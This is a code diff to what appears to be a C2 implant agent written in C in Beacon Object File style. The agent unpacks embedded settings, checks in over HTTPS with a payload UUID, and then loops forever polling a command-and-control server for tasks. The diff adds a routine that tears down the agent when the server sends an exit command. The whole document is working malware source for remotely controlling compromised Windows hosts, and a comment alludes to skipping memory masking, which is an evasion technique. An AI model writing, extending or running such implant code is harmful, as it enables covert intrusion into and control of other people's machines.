@@ -12,6 +12,8 @@ WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(	HANDLE hHandle, DWORD dwMi
 
 WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD  dwFreeType);
 
+WINBASEAPI VOID WINAPI NTDLL$ExitProcess(UINT uExitCode);
+
 WINBASEAPI size_t MSVCRT$strlen(const char *str);
 WINBASEAPI int MSVCRT$strcmp(const char *string1, const char *string2);
 
@@ -28,7 +30,13 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
-void perform_checkin(AgentParams *params, CheckinReply *reply, HttpHandle *http) {
+void agent_exit(AgentState *state) {
+	HttpDestroy(state->http);
+	free_params(&state->params);
+	NTDLL$ExitProcess(0); // currently only ExitProcess() is supported TODO
+}
+
+void perform_checkin(AgentParams *params, HttpHandle *http, CheckinReply *reply) {
 	// Generate checkin payload.
 	CheckinRequest checkin = { 0 };
 	checkin.payload_uuid = clone_str(params->payload_uuid);
@@ -53,7 +61,7 @@ void perform_checkin(AgentParams *params, CheckinReply *reply, HttpHandle *http)
 	
 }
 
-void perform_tasking(AgentParams *params, TaskingReply *reply, HttpHandle *http) {
+void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply) {
 	// Generate tasking payload.
 	TaskingRequest tasking = { 0 };
 	tasking.callback_uuid = clone_str(params->callback_uuid);
@@ -78,9 +86,10 @@ void perform_tasking(AgentParams *params, TaskingReply *reply, HttpHandle *http)
 	KERNEL32$VirtualFree(response.content_type, 0, MEM_RELEASE);
 }
 
-void process_task(TaskInfo *task) {
+void process_task(TaskInfo *task, AgentState *state) {
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
 		dprintf("Received exit command.");
+		agent_exit(state);
 		return;
 	}
 	
@@ -88,41 +97,37 @@ void process_task(TaskInfo *task) {
 }
 
 void go() {
-	HttpHandle *http;
-	AgentParams params = { 0 };
+	AgentState state = { 0 };
+	
+	unpack_params(RAW_PARAMS, &state.params);
+	
+	state.http = HttpInit(state.params.callback_https);
+	
 	CheckinReply checkin_reply = { 0 };
-	
-	unpack_params(RAW_PARAMS, &params);
-	
-	http = HttpInit(params.callback_https);
-	
-	perform_checkin(&params, &checkin_reply, http);
+	perform_checkin(&state.params, state.http, &checkin_reply);
 	
 	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
-		free_params(&params);
-		free_checkin_reply(&checkin_reply);
 		dprintf("Checkin failed with: %s", checkin_reply.status);
+		free_checkin_reply(&checkin_reply);
+		agent_exit(&state);
 		return;
 	}
 	
-	params.callback_uuid = clone_str(checkin_reply.callback_uuid);
-	dprintf("Successful checkin with payload UUID %s and callback UUID %s", params.payload_uuid, params.callback_uuid);
+	state.params.callback_uuid = clone_str(checkin_reply.callback_uuid);
+	free_checkin_reply(&checkin_reply);
+	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
 	
 	while (1) {
 		// Look ma, no masking!
 		TaskingReply tasking_reply = { 0 };
-		perform_tasking(&params, &tasking_reply, http);
+		perform_tasking(&state.params, state.http, &tasking_reply);
 		
 		dprintf("Received tasking from C2 server!");
 		for (int i = 0; i < tasking_reply.tasking_size; i++) {
-			process_task(&tasking_reply.tasks[i]);
+			process_task(&tasking_reply.tasks[i], &state);
 		}
 		
 		free_tasking_reply(&tasking_reply);
 		KERNEL32$WaitForSingleObject(((HANDLE)(LONG_PTR)-1), 5000);
 	}
-
-	HttpDestroy(http);
-	free_params(&params);
-	free_checkin_reply(&checkin_reply);
 }
